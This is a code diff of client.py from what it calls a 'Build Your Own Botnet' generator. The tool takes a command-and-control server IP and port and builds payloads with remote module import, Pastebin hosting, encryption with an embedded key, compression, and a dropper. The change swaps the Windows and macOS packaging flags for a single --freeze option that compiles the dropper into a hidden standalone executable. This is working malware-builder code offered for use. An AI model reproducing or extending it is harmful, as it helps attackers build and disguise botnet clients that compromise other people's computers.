@@ -132,29 +132,36 @@ def main():
     parser = argparse.ArgumentParser(prog='client.py', 
                                     version='0.1.5',
                                     description="Generator (Build Your Own Botnet)")
+
     parser.add_argument('host',
                         action='store',
                         type=str,
                         help='server IP address')
+
     parser.add_argument('port',
                         action='store',
                         type=str,
                         help='server port number')
+
     parser.add_argument('modules',
                         metavar='module',   
                         action='append',
                         nargs='*',
                         help='module(s) to remotely import at run-time')
+
     parser.add_argument('--name',
                         action='store',
                         help='output file name')
+
     parser.add_argument('--icon',
                         action='store',
                         help='icon image file name')
+
     parser.add_argument('--pastebin',
                         action='store',
                         metavar='API',
                         help='upload the payload to Pastebin (instead of the C2 server hosting it)')
+
     parser.add_argument('--encrypt',
                         action='store_true',
                         help='encrypt the payload with a random 128-bit key embedded in the payload\'s stager',
@@ -163,17 +170,15 @@ def main():
 #                        action='store_true',
 #                        help='obfuscate names of classes, functions, variables, import-methods, and builtin-keywords',
 #                        default=False)
+
     parser.add_argument('--compress',
                         action='store_true',
                         help='zip-compress into a self-extracting python script',
                         default=False)
-    parser.add_argument('--exe',
+
+    parser.add_argument('--freeze',
                         action='store_true',
-                        help='compile client with a python interpreter into a portable executable for Windows',
-                        default=False)
-    parser.add_argument('--app',
-                        action='store_true',
-                        help='bundle client with a python interpreter into an macOS application',
+                        help='compile client into a standalone executable for the current host platform',
                         default=False)
 
     options = parser.parse_args()
@@ -411,7 +416,8 @@ def _stager(options, **kwargs):
 def _dropper(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Dropper", color='reset', style='bright')
-
+    util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
+    
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
@@ -423,22 +429,13 @@ def _dropper(options, **kwargs):
     with file(name, 'w') as fp:
         fp.write(dropper)
 
-    if options.exe:
+    if options.freeze:
         util.display('\tCompiling executable... ', color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
-        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
+        name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
-
-    elif options.app:
-        util.display('\tBundling application... ', color='reset', style='normal', end=',')
-        __load__ = threading.Event()
-        __spin__ = _spinner(__load__)
-        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
-        __load__.set()
-
-    else:
-        util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
+        
     util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
     return name
 
